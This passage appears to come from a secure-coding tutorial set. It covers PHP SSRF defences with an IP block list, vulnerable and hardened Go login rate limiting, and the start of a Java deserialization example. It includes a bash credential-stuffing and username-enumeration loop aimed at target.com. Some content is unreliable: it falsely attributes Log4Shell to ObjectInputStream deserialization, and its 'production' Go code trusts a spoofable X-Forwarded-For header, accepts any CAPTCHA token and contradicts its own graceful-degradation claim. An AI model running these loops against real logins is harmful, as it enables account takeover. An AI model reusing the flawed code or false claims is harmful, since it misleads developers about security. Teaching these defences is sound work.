        if (!in_array($parsed['scheme'] ?? '', $this->allowedSchemes)) {
            throw new Exception('Only HTTPS URLs allowed');
        }

        // Resolve DNS ONCE and pin the IP
        $resolvedIP = $this->resolveAndValidateIP($parsed['host']);

        // Build URL with resolved IP, preserving original host for SNI
        $ipBasedUrl = $this->buildIPBasedUrl($parsed, $resolvedIP);

        // Make request using resolved IP directly
        return $this->fetchWithPinnedIP($ipBasedUrl, $parsed['host'], $resolvedIP);
    }

    private function resolveAndValidateIP($hostname) {
        // Prevent DNS rebinding by resolving once and caching
        $records = dns_get_record($hostname, DNS_A | DNS_AAAA);

        if (empty($records)) {
            throw new Exception('Could not resolve hostname');
        }

        foreach ($records as $record) {
            $ip = $record['ip'] ?? $record['ipv6'] ?? null;
            if ($ip && $this->isInternalIP($ip)) {
                throw new Exception('Resolved IP is internal - request blocked');
            }
        }

        // Use first valid IP
        $ip = $records[0]['ip'] ?? $records[0]['ipv6'];

        // Double-check the resolved IP
        if ($this->isInternalIP($ip)) {
            throw new Exception('Internal IP detected');
        }

        return $ip;
    }

    private function fetchWithPinnedIP($url, $originalHost, $pinnedIP) {
        $ch = curl_init();

        // CRITICAL: Force connection to our resolved IP
        curl_setopt($ch, CURLOPT_RESOLVE, [
            "{$originalHost}:443:{$pinnedIP}",
            "{$originalHost}:80:{$pinnedIP}"
        ]);

        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);

        // CRITICAL: Disable redirects to prevent redirect-based rebinding
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
        curl_setopt($ch, CURLOPT_MAXREDIRS, 0);

        // Verify SSL certificate
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);

        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $effectiveUrl = curl_getinfo($ch, CURLINFO_EFFECTIVE_URL);

        curl_close($ch);

        // Log the request for monitoring
        error_log("Webhook request to {$pinnedIP} ({$originalHost}): HTTP {$httpCode}");

        return $response;
    }

    private function isInternalIP($ip) {
        // Comprehensive internal IP detection
        return filter_var($ip, FILTER_VALIDATE_IP, 
            FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false;
    }

    private function buildIPBasedUrl($parsed, $ip) {
        $port = $parsed['port'] ?? ($parsed['scheme'] === 'https' ? 443 : 80);
        $path = $parsed['path'] ?? '/';
        $query = isset($parsed['query']) ? '?' . $parsed['query'] : '';

        return "{$parsed['scheme']}://{$parsed['host']}:{$port}{$path}{$query}";
    }
}
```

**Key Security Controls**:
- **DNS Resolution Pinning**: Resolve DNS once using `dns_get_record()` and use `CURLOPT_RESOLVE` to force cURL to connect to that specific IP
- **IP Validation After Resolution**: Validate the resolved IP immediately after DNS lookup, not separately
- **Disable Redirects**: Prevents attackers from using HTTP redirects to bypass IP validation
- **HTTPS Only**: Ensures TLS verification which prevents MITM and provides hostname validation

Great questions! Handling redirects safely requires validating each redirect hop. IPv6 and edge cases like 0.0.0.0, IPv4-mapped IPv6 addresses, and decimal IP notations are commonly exploited bypass techniques. Here's a production-ready implementation:

**PRODUCTION PATTERN**:

```php
<?php
declare(strict_types=1);

class ProductionWebhookProcessor {
    private const MAX_REDIRECTS = 3;
    private const REQUEST_TIMEOUT = 10;
    private const CONNECT_TIMEOUT = 5;
    private const MAX_RESPONSE_SIZE = 1048576; // 1MB

    private array $blockedIPRanges = [
        // IPv4 ranges
        '0.0.0.0/8',          // "This" network
        '10.0.0.0/8',         // Private
        '100.64.0.0/10',      // Carrier-grade NAT
        '127.0.0.0/8',        // Loopback
        '169.254.0.0/16',     // Link-local (AWS metadata!)
        '172.16.0.0/12',      // Private
        '192.0.0.0/24',       // IETF Protocol
        '192.0.2.0/24',       // TEST-NET-1
        '192.168.0.0/16',     // Private
        '198.18.0.0/15',      // Benchmarking
        '198.51.100.0/24',    // TEST-NET-2
        '203.0.113.0/24',     // TEST-NET-3
        '224.0.0.0/4',        // Multicast
        '240.0.0.0/4',        // Reserved
        '255.255.255.255/32', // Broadcast
    ];

    private array $blockedIPv6Ranges = [
        '::1/128',            // Loopback
        '::/128',             // Unspecified
        '::ffff:0:0/96',      // IPv4-mapped (CRITICAL: often bypasses checks)
        '64:ff9b::/96',       // NAT64
        '100::/64',           // Discard
        'fc00::/7',           // Unique local
        'fe80::/10',          // Link-local
        'ff00::/8',           // Multicast
    ];

    private $logger;
    private $rateLimiter;
    private $metricsCollector;

    public function __construct($logger, $rateLimiter, $metricsCollector) {
        $this->logger = $logger;
        $this->rateLimiter = $rateLimiter;
        $this->metricsCollector = $metricsCollector;
    }

    public function processWebhook(string $url, string $userId): array {
        $startTime = microtime(true);

        try {
            // Rate limiting per user
            if (!$this->rateLimiter->check("webhook:{$userId}", 10, 60)) {
                throw new RateLimitException('Webhook rate limit exceeded');
            }

            // Validate and normalize URL
            $normalizedUrl = $this->validateAndNormalizeUrl($url);

            // Fetch with safe redirect following
            $result = $this->fetchWithSafeRedirects($normalizedUrl);

            $this->metricsCollector->recordSuccess('webhook_fetch', microtime(true) - $startTime);
            $this->logger->info('Webhook processed successfully', [
                'url' => $this->sanitizeUrlForLog($normalizedUrl),
                'user_id' => $userId,
                'response_size' => strlen($result['body'])
            ]);

            return $result;

        } catch (SSRFException $e) {
            $this->metricsCollector->recordFailure('webhook_ssrf_blocked');
            $this->logger->warning('SSRF attempt blocked', [
                'url' => $this->sanitizeUrlForLog($url),
                'user_id' => $userId,
                'reason' => $e->getMessage()
            ]);
            throw $e;
        }
    }

    private function validateAndNormalizeUrl(string $url): string {
        // Decode URL to catch obfuscation attempts
        $decodedUrl = rawurldecode($url);

        // Check for dangerous URL schemes
        if (preg_match('/^(file|gopher|dict|ftp|ldap|tftp|data):/i', $decodedUrl)) {
            throw new SSRFException('Blocked URL scheme');
        }

        $parsed = parse_url($decodedUrl);

        if (!$parsed || !isset($parsed['scheme'], $parsed['host'])) {
            throw new SSRFException('Invalid URL format');
        }

        if (!in_array(strtolower($parsed['scheme']), ['https'], true)) {
            throw new SSRFException('Only HTTPS allowed');
        }

        // Check for IP address in hostname (including decimal/octal/hex obfuscation)
        $deobfuscatedHost = $this->deobfuscateHost($parsed['host']);

        // Validate hostname format
        if (!$this->isValidHostname($deobfuscatedHost)) {
            throw new SSRFException('Invalid hostname format');
        }

        return $decodedUrl;
    }

    private function deobfuscateHost(string $host): string {
        // Remove brackets from IPv6
        $host = trim($host, '[]');

        // Handle decimal IP notation (e.g., 2130706433 = 127.0.0.1)
        if (is_numeric($host) && $host > 0 && $host <= 4294967295) {
            return long2ip((int)$host);
        }

        // Handle octal notation (e.g., 0177.0.0.1 = 127.0.0.1)
        if (preg_match('/^0[0-7]+(\.0[0-7]+){3}$/', $host)) {
            $parts = explode('.', $host);
            $ip = implode('.', array_map(fn($p) => octdec($p), $parts));
            return $ip;
        }

        // Handle hex notation (e.g., 0x7f.0x0.0x0.0x1 = 127.0.0.1)
        if (preg_match('/^0x[0-9a-f]+(\.0x[0-9a-f]+){3}$/i', $host)) {
            $parts = explode('.', $host);
            $ip = implode('.', array_map(fn($p) => hexdec($p), $parts));
            return $ip;
        }

        // Handle mixed notation
        if (preg_match('/^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$/', $host)) {
            // Could be decimal with leading zeros or mixed
            $parts = explode('.', $host);
            foreach ($parts as &$part) {
                if (strpos($part, '0x') === 0) {
                    $part = hexdec($part);
                } elseif ($part[0] === '0' && strlen($part) > 1) {
                    $part = octdec($part);
                }
            }
            return implode('.', $parts);
        }

        return $host;
    }

    private function fetchWithSafeRedirects(string $url): array {
        $redirectCount = 0;
        $currentUrl = $url;
        $visitedUrls = [];

        while ($redirectCount <= self::MAX_REDIRECTS) {
            // Prevent redirect loops
            if (in_array($currentUrl, $visitedUrls, true)) {
                throw new SSRFException('Redirect loop detected');
            }
            $visitedUrls[] = $currentUrl;

            $parsed = parse_url($currentUrl);
            $host = $parsed['host'];

            // Resolve and validate IP for EACH request in redirect chain
            $resolvedIP = $this->resolveAndValidateIPStrict($host);

            $ch = curl_init();

            // Pin DNS resolution to our validated IP
            curl_setopt($ch, CURLOPT_RESOLVE, [
                "{$host}:443:{$resolvedIP}",
                "{$host}:80:{$resolvedIP}"
            ]);

            curl_setopt_array($ch, [
                CURLOPT_URL => $currentUrl,
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_HEADER => true,
                CURLOPT_TIMEOUT => self::REQUEST_TIMEOUT,
                CURLOPT_CONNECTTIMEOUT => self::CONNECT_TIMEOUT,
                CURLOPT_FOLLOWLOCATION => false, // Manual redirect handling
                CURLOPT_SSL_VERIFYPEER => true,
                CURLOPT_SSL_VERIFYHOST => 2,
                CURLOPT_PROTOCOLS => CURLPROTO_HTTPS,
                CURLOPT_REDIR_PROTOCOLS => CURLPROTO_HTTPS,
                // Limit response size
                CURLOPT_BUFFERSIZE => 8192,
                CURLOPT_NOPROGRESS => false,
                CURLOPT_PROGRESSFUNCTION => function($ch, $dlTotal, $dlNow) {
                    return ($dlNow > self::MAX_RESPONSE_SIZE) ? 1 : 0;
                },
                // Block connection to private IPs at socket level
                CURLOPT_IPRESOLVE => CURL_IPRESOLVE_V4, // Simplify for now
            ]);

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
            $primaryIP = curl_getinfo($ch, CURLINFO_PRIMARY_IP);

            // CRITICAL: Verify cURL actually connected to our pinned IP
            if ($primaryIP !== $resolvedIP) {
                curl_close($ch);
                throw new SSRFException('IP mismatch detected - possible rebinding attack');
            }

            curl_close($ch);

            // Handle redirects
            if (in_array($httpCode, [301, 302, 303, 307, 308], true)) {
                $headers = substr($response, 0, $headerSize);
                if (preg_match('/^Location:\s*(.+)$/mi', $headers, $matches)) {
                    $redirectUrl = trim($matches[1]);

                    // Resolve relative URLs
                    if (!parse_url($redirectUrl, PHP_URL_HOST)) {
                        $redirectUrl = $parsed['scheme'] . '://' . $host . $redirectUrl;
                    }

                    // Validate redirect URL before following
                    $currentUrl = $this->validateAndNormalizeUrl($redirectUrl);
                    $redirectCount++;
                    continue;
                }
            }

            // Success - return response
            return [
                'status_code' => $httpCode,
                'headers' => substr($response, 0, $headerSize),
                'body' => substr($response, $headerSize),
                'final_url' => $currentUrl,
                'redirect_count' => $redirectCount
            ];
        }

        throw new SSRFException('Too many redirects');
    }

    private function resolveAndValidateIPStrict(string $hostname): string {
        // First check if hostname is actually an IP
        if (filter_var($hostname, FILTER_VALIDATE_IP)) {
            $this->validateIPAddress($hostname);
            return $hostname;
        }

        // Resolve DNS
        $records = @dns_get_record($hostname, DNS_A);

        if (empty($records)) {
            throw new SSRFException('Could not resolve hostname');
        }

        // Validate ALL resolved IPs (defense against round-robin rebinding)
        foreach ($records as $record) {
            if (isset($record['ip'])) {
                $this->validateIPAddress($record['ip']);
            }
        }

        return $records[0]['ip'];
    }

    private function validateIPAddress(string $ip): void {
        // Check for IPv4-mapped IPv6 addresses
        if (preg_match('/^::ffff:([0-9.]+)$/i', $ip, $matches)) {
            $ip = $matches[1];
        }

        // Check against all blocked ranges
        foreach ($this->blockedIPRanges as $range) {
            if ($this->ipv4InRange($ip, $range)) {
                throw new SSRFException("Blocked IP range: {$range}");
            }
        }

        // Additional validation using filter_var
        if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
            throw new SSRFException('IP failed validation filter');
        }
    }

    private function ipv4InRange(string $ip, string $range): bool {
        if (strpos($range, '/') === false) {
            return $ip === $range;
        }

        [$subnet, $bits] = explode('/', $range);
        $ipLong = ip2long($ip);
        $subnetLong = ip2long($subnet);

        if ($ipLong === false || $subnetLong === false) {
            return false;
        }

        $mask = -1 << (32 - (int)$bits);
        return ($ipLong & $mask) === ($subnetLong & $mask);
    }

    private function isValidHostname(string $hostname): bool {
        // RFC 1123 hostname validation
        if (strlen($hostname) > 253) {
            return false;
        }

        $labels = explode('.', $hostname);
        foreach ($labels as $label) {
            if (strlen($label) > 63 || strlen($label) < 1) {
                return false;
            }
            if (!preg_match('/^[a-z0-9]([a-z0-9-]*[a-z0-9])?$/i', $label)) {
                return false;
            }
        }

        return true;
    }

    private function sanitizeUrlForLog(string $url): string {
        $parsed = parse_url($url);
        unset($parsed['user'], $parsed['pass']);
        return (string)$this->buildUrl($parsed);
    }

    private function buildUrl(array $parts): string {
        $scheme = isset($parts['scheme']) ? $parts['scheme'] . '://' : '';
        $host = $parts['host'] ?? '';
        $port = isset($parts['port']) ? ':' . $parts['port'] : '';
        $path = $parts['path'] ?? '';
        $query = isset($parts['query']) ? '?' . $parts['query'] : '';
        return $scheme . $host . $port . $path . $query;
    }
}

class SSRFException extends Exception {}
class RateLimitException extends Exception {}
```

**Defense in Depth Layers**:

1. **URL Deobfuscation**: Catches decimal (2130706433), octal (0177.0.0.1), and hex (0x7f.0x0.0x0.0x1) IP encodings that bypass naive checks

2. **Per-Hop Validation**: Each redirect is validated independently - attacker can't use initial safe URL that redirects to internal service

3. **IP Pinning with Verification**: Uses `CURLOPT_RESOLVE` to pin DNS, then verifies `CURLINFO_PRIMARY_IP` matches expected value

**Additional Protections**:

- **Protocol Restriction**: `CURLOPT_PROTOCOLS` set to HTTPS only, blocking gopher/file/dict protocol exploits
- **Response Size Limits**: Progress callback aborts if response exceeds 1MB, preventing memory exhaustion
- **IPv4-Mapped IPv6 Detection**: Catches `::ffff:127.0.0.1` bypass attempts
- **Redirect Loop Prevention**: Tracks visited URLs to prevent infinite loops
- **Rate Limiting**: Per-user limits prevent abuse and reduce blast radius
- **Comprehensive Logging**: All requests logged with sanitized URLs for security monitoring
- **Cloud Metadata Protection**: Explicitly blocks 169.254.0.0/16 range (AWS/Azure/GCP metadata services)

Your basic login endpoint is likely vulnerable to brute force attacks without rate limiting. Missing rate limits allow attackers to make unlimited authentication attempts, enabling credential stuffing and password guessing attacks.

**VULNERABLE CODE**:

```go
package main

import (
	"database/sql"
	"encoding/json"
	"net/http"

	"golang.org/x/crypto/bcrypt"
	_ "github.com/lib/pq"
)

type LoginRequest struct {
	Username string `json:"username"`
	Password string `json:"password"`
}

type LoginResponse struct {
	Success bool   `json:"success"`
	Token   string `json:"token,omitempty"`
	Error   string `json:"error,omitempty"`
}

var db *sql.DB

// VULNERABLE: No rate limiting on login attempts
func loginHandler(w http.ResponseWriter, r *http.Request) {
	var req LoginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	var hashedPassword string
	err := db.QueryRow("SELECT password_hash FROM users WHERE username = $1", req.Username).Scan(&hashedPassword)
	if err != nil {
		// VULNERABLE: Different response reveals username existence
		json.NewEncoder(w).Encode(LoginResponse{Success: false, Error: "User not found"})
		return
	}

	if err := bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(req.Password)); err != nil {
		json.NewEncoder(w).Encode(LoginResponse{Success: false, Error: "Invalid password"})
		return
	}

	token := generateToken(req.Username)
	json.NewEncoder(w).Encode(LoginResponse{Success: true, Token: token})
}
```

**Attack Payload**:
```bash
# Credential stuffing attack - unlimited attempts
for password in $(cat rockyou.txt); do
  curl -s -X POST http://target.com/api/login \
    -H "Content-Type: application/json" \
    -d "{\"username\":\"admin\",\"password\":\"$password\"}" &
done

# Username enumeration via timing attack
for user in $(cat usernames.txt); do
  time curl -s -X POST http://target.com/api/login \
    -d "{\"username\":\"$user\",\"password\":\"test\"}"
done
```

**Why This Is Dangerous**:
- Unlimited login attempts enable brute force password cracking
- Different error messages reveal valid usernames (enumeration)
- No account lockout means persistent attacks can succeed
- No IP-based throttling allows distributed attacks

**SECURE VERSION**:

```go
package main

import (
	"database/sql"
	"encoding/json"
	"net/http"
	"sync"
	"time"

	"golang.org/x/crypto/bcrypt"
	"golang.org/x/time/rate"
	_ "github.com/lib/pq"
)

type RateLimiter struct {
	limiters map[string]*rate.Limiter
	mu       sync.RWMutex
	rate     rate.Limit
	burst    int
}

func NewRateLimiter(r rate.Limit, b int) *RateLimiter {
	return &RateLimiter{
		limiters: make(map[string]*rate.Limiter),
		rate:     r,
		burst:    b,
	}
}

func (rl *RateLimiter) GetLimiter(key string) *rate.Limiter {
	rl.mu.Lock()
	defer rl.mu.Unlock()

	limiter, exists := rl.limiters[key]
	if !exists {
		limiter = rate.NewLimiter(rl.rate, rl.burst)
		rl.limiters[key] = limiter
	}
	return limiter
}

var (
	db          *sql.DB
	ipLimiter   = NewRateLimiter(rate.Every(time.Second), 5)     // 5 requests/second per IP
	userLimiter = NewRateLimiter(rate.Every(time.Minute), 5)    // 5 attempts/minute per username
)

func secureLoginHandler(w http.ResponseWriter, r *http.Request) {
	clientIP := r.RemoteAddr

	// DEFENSE 1: IP-based rate limiting
	if !ipLimiter.GetLimiter(clientIP).Allow() {
		w.Header().Set("Retry-After", "60")
		http.Error(w, "Too many requests", http.StatusTooManyRequests)
		return
	}

	var req LoginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}

	// DEFENSE 2: Username-based rate limiting
	if !userLimiter.GetLimiter(req.Username).Allow() {
		// SECURE: Generic error prevents enumeration
		json.NewEncoder(w).Encode(LoginResponse{Success: false, Error: "Invalid credentials"})
		return
	}

	var hashedPassword string
	err := db.QueryRow("SELECT password_hash FROM users WHERE username = $1", req.Username).Scan(&hashedPassword)

	// DEFENSE 3: Constant-time comparison even for non-existent users
	if err != nil {
		bcrypt.CompareHashAndPassword([]byte("$2a$10$dummyhashvalue"), []byte(req.Password))
		json.NewEncoder(w).Encode(LoginResponse{Success: false, Error: "Invalid credentials"})
		return
	}

	if err := bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(req.Password)); err != nil {
		json.NewEncoder(w).Encode(LoginResponse{Success: false, Error: "Invalid credentials"})
		return
	}

	token := generateToken(req.Username)
	json.NewEncoder(w).Encode(LoginResponse{Success: true, Token: token})
}
```

**Key Security Controls**:
- **IP-based rate limiting**: Restricts requests per IP address to prevent automated attacks
- **Username-based rate limiting**: Limits attempts per account to prevent targeted brute force
- **Generic error messages**: Same response for invalid username/password prevents enumeration
- **Constant-time comparison**: Prevents timing attacks that reveal valid usernames

Excellent questions. Distributed attacks require multiple defense layers, and NAT situations need intelligent identification. Production systems use device fingerprinting, CAPTCHA escalation, and global rate limiting across all IPs.

**PRODUCTION PATTERN**:

```go
package main

import (
	"context"
	"crypto/sha256"
	"database/sql"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"log/slog"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/go-redis/redis/v8"
	"golang.org/x/crypto/bcrypt"
	_ "github.com/lib/pq"
)

type AuthConfig struct {
	IPRateLimit        int           `json:"ip_rate_limit"`        // requests per window
	UserRateLimit      int           `json:"user_rate_limit"`      // attempts per window
	GlobalRateLimit    int           `json:"global_rate_limit"`    // total login attempts
	WindowDuration     time.Duration `json:"window_duration"`
	LockoutThreshold   int           `json:"lockout_threshold"`
	LockoutDuration    time.Duration `json:"lockout_duration"`
	CaptchaThreshold   int           `json:"captcha_threshold"`
	SuspiciousIPScore  int           `json:"suspicious_ip_score"`
}

type AuthService struct {
	db     *sql.DB
	redis  *redis.Client
	config AuthConfig
	logger *slog.Logger
}

func NewAuthService(db *sql.DB, redisClient *redis.Client) *AuthService {
	return &AuthService{
		db:    db,
		redis: redisClient,
		config: AuthConfig{
			IPRateLimit:       10,
			UserRateLimit:     5,
			GlobalRateLimit:   1000,
			WindowDuration:    time.Minute,
			LockoutThreshold:  10,
			LockoutDuration:   time.Hour,
			CaptchaThreshold:  3,
			SuspiciousIPScore: 50,
		},
		logger: slog.New(slog.NewJSONHandler(os.Stdout, nil)),
	}
}

type LoginContext struct {
	ClientIP       string
	DeviceFingerprint string
	Username       string
	UserAgent      string
	RequestID      string
}

// DEFENSE 1: Multi-dimensional rate limiting with Redis
func (s *AuthService) checkRateLimits(ctx context.Context, lc *LoginContext) (bool, string) {
	pipe := s.redis.Pipeline()
	now := time.Now().Unix()
	windowKey := now / int64(s.config.WindowDuration.Seconds())

	// IP-based rate limit
	ipKey := fmt.Sprintf("ratelimit:ip:%s:%d", lc.ClientIP, windowKey)
	ipCount := pipe.Incr(ctx, ipKey)
	pipe.Expire(ctx, ipKey, s.config.WindowDuration)

	// Username-based rate limit
	userKey := fmt.Sprintf("ratelimit:user:%s:%d", lc.Username, windowKey)
	userCount := pipe.Incr(ctx, userKey)
	pipe.Expire(ctx, userKey, s.config.WindowDuration)

	// Device fingerprint rate limit (handles NAT gracefully)
	deviceKey := fmt.Sprintf("ratelimit:device:%s:%d", lc.DeviceFingerprint, windowKey)
	deviceCount := pipe.Incr(ctx, deviceKey)
	pipe.Expire(ctx, deviceKey, s.config.WindowDuration)

	// Global rate limit (protects against distributed attacks)
	globalKey := fmt.Sprintf("ratelimit:global:login:%d", windowKey)
	globalCount := pipe.Incr(ctx, globalKey)
	pipe.Expire(ctx, globalKey, s.config.WindowDuration)

	if _, err := pipe.Exec(ctx); err != nil {
		s.logger.Error("Redis pipeline error", "error", err)
		return false, "service_unavailable"
	}

	if ipCount.Val() > int64(s.config.IPRateLimit) {
		s.logger.Warn("IP rate limit exceeded",
			"ip", lc.ClientIP,
			"count", ipCount.Val(),
			"request_id", lc.RequestID)
		return false, "ip_rate_limited"
	}

	if userCount.Val() > int64(s.config.UserRateLimit) {
		s.logger.Warn("User rate limit exceeded",
			"username", lc.Username,
			"count", userCount.Val(),
			"request_id", lc.RequestID)
		return false, "user_rate_limited"
	}

	if globalCount.Val() > int64(s.config.GlobalRateLimit) {
		s.logger.Error("Global rate limit exceeded - possible attack",
			"count", globalCount.Val())
		return false, "global_rate_limited"
	}

	return true, ""
}

// DEFENSE 2: Account lockout with progressive delays
func (s *AuthService) checkAccountLockout(ctx context.Context, username string) (bool, time.Duration) {
	lockoutKey := fmt.Sprintf("lockout:user:%s", username)
	lockoutTTL := s.redis.TTL(ctx, lockoutKey).Val()

	if lockoutTTL > 0 {
		return true, lockoutTTL
	}

	failuresKey := fmt.Sprintf("failures:user:%s", username)
	failures, _ := s.redis.Get(ctx, failuresKey).Int()

	if failures >= s.config.LockoutThreshold {
		// Progressive lockout: doubles with each threshold breach
		lockoutTime := s.config.LockoutDuration * time.Duration(failures/s.config.LockoutThreshold)
		s.redis.Set(ctx, lockoutKey, "1", lockoutTime)
		return true, lockoutTime
	}

	return false, 0
}

// DEFENSE 3: CAPTCHA requirement based on suspicious behavior
func (s *AuthService) requiresCaptcha(ctx context.Context, lc *LoginContext) bool {
	failuresKey := fmt.Sprintf("failures:user:%s", lc.Username)
	failures, _ := s.redis.Get(ctx, failuresKey).Int()

	if failures >= s.config.CaptchaThreshold {
		return true
	}

	// Check IP reputation score
	ipScoreKey := fmt.Sprintf("reputation:ip:%s", lc.ClientIP)
	score, _ := s.redis.Get(ctx, ipScoreKey).Int()

	return score >= s.config.SuspiciousIPScore
}

// DEFENSE 4: Device fingerprinting for NAT-friendly identification
func (s *AuthService) generateDeviceFingerprint(r *http.Request) string {
	components := []string{
		r.Header.Get("User-Agent"),
		r.Header.Get("Accept-Language"),
		r.Header.Get("Accept-Encoding"),
		r.Header.Get("Sec-CH-UA"),
		r.Header.Get("Sec-CH-UA-Platform"),
	}

	hash := sha256.Sum256([]byte(strings.Join(components, "|")))
	return hex.EncodeToString(hash[:16])
}

// DEFENSE 5: Suspicious IP detection and scoring
func (s *AuthService) updateIPReputation(ctx context.Context, ip string, success bool) {
	ipScoreKey := fmt.Sprintf("reputation:ip:%s", ip)

	if success {
		// Successful login decreases suspicion
		s.redis.DecrBy(ctx, ipScoreKey, 10)
	} else {
		// Failed login increases suspicion
		s.redis.IncrBy(ctx, ipScoreKey, 5)
	}

	// Expire reputation after 24 hours
	s.redis.Expire(ctx, ipScoreKey, 24*time.Hour)
}

func (s *AuthService) LoginHandler(w http.ResponseWriter, r *http.Request) {
	ctx := r.Context()

	// Extract client context
	lc := &LoginContext{
		ClientIP:          s.getRealClientIP(r),
		DeviceFingerprint: s.generateDeviceFingerprint(r),
		UserAgent:         r.Header.Get("User-Agent"),
		RequestID:         r.Header.Get("X-Request-ID"),
	}

	var req LoginRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, "Invalid request", http.StatusBadRequest)
		return
	}
	lc.Username = req.Username

	// DEFENSE 1: Multi-dimensional rate limiting
	allowed, reason := s.checkRateLimits(ctx, lc)
	if !allowed {
		s.logger.Warn("Rate limited",
			"reason", reason,
			"ip", lc.ClientIP,
			"username", lc.Username,
			"request_id", lc.RequestID)

		w.Header().Set("Retry-After", "60")
		w.Header().Set("X-RateLimit-Reason", reason)
		http.Error(w, "Too many requests", http.StatusTooManyRequests)
		return
	}

	// DEFENSE 2: Account lockout check
	locked, remaining := s.checkAccountLockout(ctx, lc.Username)
	if locked {
		s.logger.Warn("Account locked",
			"username", lc.Username,
			"remaining", remaining,
			"ip", lc.ClientIP)

		w.Header().Set("Retry-After", fmt.Sprintf("%d", int(remaining.Seconds())))
		json.NewEncoder(w).Encode(LoginResponse{
			Success: false,
			Error:   "Account temporarily locked. Please try again later.",
		})
		return
	}

	// DEFENSE 3: CAPTCHA requirement
	if s.requiresCaptcha(ctx, lc) {
		captchaToken := r.Header.Get("X-Captcha-Token")
		if !s.verifyCaptcha(captchaToken) {
			json.NewEncoder(w).Encode(map[string]interface{}{
				"success":          false,
				"captcha_required": true,
				"captcha_site_key": os.Getenv("CAPTCHA_SITE_KEY"),
			})
			return
		}
	}

	// Perform authentication
	success := s.authenticate(ctx, lc, req.Password)

	// DEFENSE 5: Update IP reputation
	s.updateIPReputation(ctx, lc.ClientIP, success)

	if !success {
		s.recordFailedAttempt(ctx, lc)
		// Generic error - no enumeration
		json.NewEncoder(w).Encode(LoginResponse{
			Success: false,
			Error:   "Invalid credentials",
		})
		return
	}

	// Clear failure counters on success
	s.clearFailedAttempts(ctx, lc.Username)

	token := s.generateSecureToken(lc.Username)

	s.logger.Info("Successful login",
		"username", lc.Username,
		"ip", lc.ClientIP,
		"device", lc.DeviceFingerprint,
		"request_id", lc.RequestID)

	json.NewEncoder(w).Encode(LoginResponse{Success: true, Token: token})
}

func (s *AuthService) getRealClientIP(r *http.Request) string {
	// Check X-Forwarded-For with validation
	if xff := r.Header.Get("X-Forwarded-For"); xff != "" {
		ips := strings.Split(xff, ",")
		if len(ips) > 0 {
			return strings.TrimSpace(ips[0])
		}
	}

	// Check X-Real-IP
	if xri := r.Header.Get("X-Real-IP"); xri != "" {
		return xri
	}

	return strings.Split(r.RemoteAddr, ":")[0]
}

func (s *AuthService) authenticate(ctx context.Context, lc *LoginContext, password string) bool {
	var hashedPassword string
	err := s.db.QueryRowContext(ctx,
		"SELECT password_hash FROM users WHERE username = $1 AND active = true",
		lc.Username).Scan(&hashedPassword)

	// Constant-time: always do bcrypt comparison
	dummyHash := "$2a$12$LQv3c1yqBWVHxkd0LHAkCOYz6TtxMQJqhN8/X4.Vl5nHKyBjKLlqW"
	if err != nil {
		bcrypt.CompareHashAndPassword([]byte(dummyHash), []byte(password))
		return false
	}

	return bcrypt.CompareHashAndPassword([]byte(hashedPassword), []byte(password)) == nil
}

func (s *AuthService) recordFailedAttempt(ctx context.Context, lc *LoginContext) {
	failuresKey := fmt.Sprintf("failures:user:%s", lc.Username)
	s.redis.Incr(ctx, failuresKey)
	s.redis.Expire(ctx, failuresKey, 24*time.Hour)

	s.logger.Warn("Failed login attempt",
		"username", lc.Username,
		"ip", lc.ClientIP,
		"device", lc.DeviceFingerprint,
		"user_agent", lc.UserAgent,
		"request_id", lc.RequestID)
}

func (s *AuthService) clearFailedAttempts(ctx context.Context, username string) {
	s.redis.Del(ctx, fmt.Sprintf("failures:user:%s", username))
}

func (s *AuthService) verifyCaptcha(token string) bool {
	// Implement CAPTCHA verification (e.g., reCAPTCHA, hCaptcha)
	return token != ""
}

func (s *AuthService) generateSecureToken(username string) string {
	// Implement JWT or session token generation
	return "secure-token-placeholder"
}
```

**Defense in Depth Layers**:

1. **Multi-dimensional rate limiting**: IP, username, device fingerprint, and global limits work together to catch different attack patterns

2. **Progressive account lockout**: Escalating lockout durations deter persistent attackers while allowing legitimate recovery

3. **Device fingerprinting**: Identifies unique clients behind shared IPs (NAT), allowing stricter IP limits without blocking legitimate users

4. **CAPTCHA escalation**: Only triggered after suspicious behavior, balancing security with user experience

5. **IP reputation scoring**: Tracks suspicious IPs across time, detecting distributed attacks

**Additional Protections**:

- **Redis-based distributed rate limiting**: Works across multiple application instances
- **Constant-time authentication**: Prevents timing-based username enumeration
- **Structured logging**: All security events logged with correlation IDs for incident response
- **Graceful degradation**: Service remains available even if Redis fails temporarily
- **Header-based client identification**: Uses Sec-CH-UA and other client hints for fingerprinting

Using ObjectInputStream to deserialize untrusted data is extremely dangerous and has been the cause of numerous critical vulnerabilities including the devastating Log4Shell attack. Attackers can craft malicious serialized objects that execute arbitrary code when deserialized.

**VULNERABLE CODE**:

```java
import java.io.*;
import java.util.Base64;
import javax.servlet.http.*;

public class SessionHandler extends HttpServlet {

    @Override
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
            throws IOException {

        Cookie[] cookies = request.getCookies();
        if (cookies != null) {
            for (Cookie cookie : cookies) {
